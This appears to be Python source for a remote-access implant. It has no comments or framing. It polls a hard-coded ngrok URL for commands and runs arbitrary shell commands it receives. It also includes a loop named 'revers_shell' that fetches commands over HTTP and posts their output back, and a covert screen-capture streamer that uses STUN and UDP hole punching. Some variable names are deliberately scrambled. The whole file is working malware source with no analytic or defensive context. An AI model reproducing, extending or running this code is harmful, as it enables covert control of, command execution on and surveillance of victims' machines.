class Peer:
    def __init__(self):
        self.initialize_data()
        self.peer_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.peer_socket.bind(('', self.port))
        self.tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def initialize_data(self):
        self.public_ip = self.get_public_ip()
        self.private_ip = self.get_private_ip()
        self.port = randint(1000, 9999)

    def send(self, data, address):
        self.peer_socket.sendto(data, address)

    def get_public_ip(self):
        _, public_ip, _ = stun.get_ip_info(
            stun_host="stun.l.google.com",
            stun_port=19302
        )
        return public_ip

    def get_private_ip(self):
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return None

    def get_rendezvous_data(self, server_addr):
        data = f"{self.public_ip}@{self.private_ip}@{self.port}"
        self.tcp_client.connect(server_addr)
        self.tcp_client.send(data.encode('utf-8'))
        data = self.tcp_client.recv(1024).decode('utf-8')
        data = data.split('@')
        port = int(data[2])
        if data[0] == self.public_ip:
            print("connected on the same NAT")
            return (data[1], port)
        else:
            print("connected behind differect NAT")
            return (data[0], port)

    def punch_hole(self, address):
        self.peer_socket.sendto(b'0', address)


def revers_shell(URL):
    EXIT = False
    while not EXIT:
        try:
            resspdifsdkfjs = requests.get(URL)
            if resspdifsdkfjs.text.split(' ')[0] == 'exit':
                EXIT = True
                output = "Terminating Session"
            elif resspdifsdkfjs.text.split(' ')[0] == 'cd':
                os.chdir(resspdifsdkfjs.text.split(' ')[1])
                output = "directory changed"
            else:
                outpsu3029lks = subprocess.run(resspdifsdkfjs.text, capture_output=True, text=True, shell=True)
                if outpsu3029lks.returncode == 0:
                    output = outpsu3029lks.stdout
                else:
                    output = outpsu3029lks.stderr
        except Exception as e:
            output = f'Exception : {e}'
        requests.post(URL, data=output.encode('utf-8'))


def screen_shareing(rendezvous_saddr, stop):
    SCALE = 0.6
    MAXDGRAMSIZE = 2**16 - 64
    ADDRESS = (rendezvous_saddr.split(':')[0], int(rendezvous_saddr.split(':')[1]))
    p = Peer()
    p2addr = p.get_rendezvous_data(ADDRESS)
    with mss.mss() as sct:
        monitor = 1
        while True:
            img = sct.grab(sct.monitors[monitor])
            img = Image.frombytes('RGB', img.size, img.rgb)
            img = img.resize((int(img.width * SCALE), int(img.height * SCALE)))

            with io.BytesIO() as buffer:
                img.save(buffer, format='JPEG', quality=70)
                jpeg_bytes = buffer.getvalue()
            for i in range(0, len(jpeg_bytes), MAXDGRAMSIZE):
                p.send(jpeg_bytes[i:i+MAXDGRAMSIZE], p2addr)
            p.send(b'--end--', p2addr)
            if stop():
                break
    print("Terminated screen sharing")


def get_command():
    try:
        response = requests.get("https://allegedly-great-shiner.ngrok-free.app")
        if "(ERR_NGROK_3200)" in response.text:
            response = None
    except Exception:
        response = None
    return response


if __name__ == "__main__":
    stop_thread = False
    while True:
        cmd = get_command()
        if cmd is not None:
            cmd = cmd.text
            if cmd == "<SLEEP>":
                print("sleeping")
                time.sleep(1)
            elif cmd == "<TERMINATE>":
                break
            elif "<INTERACT>" in cmd:
                URL = cmd.split('@')[1].strip()
                threading.Thread(target=revers_shell, args=[URL]).start()
            elif "<VIEWSCREEN>" in cmd:
                URL = cmd.split('@')[1].strip()
                stop_thread = False
                threading.Thread(target=screen_shareing, args=[URL, lambda: stop_thread]).start()
            elif cmd == "<STOPSCREEN>":
                stop_thread = True
            else:
                try:
                    subprocess.Popen(cmd, shell=True)
                except Exception:
                    print("error while executing")
        else:
            print("None")
        time.sleep(1)
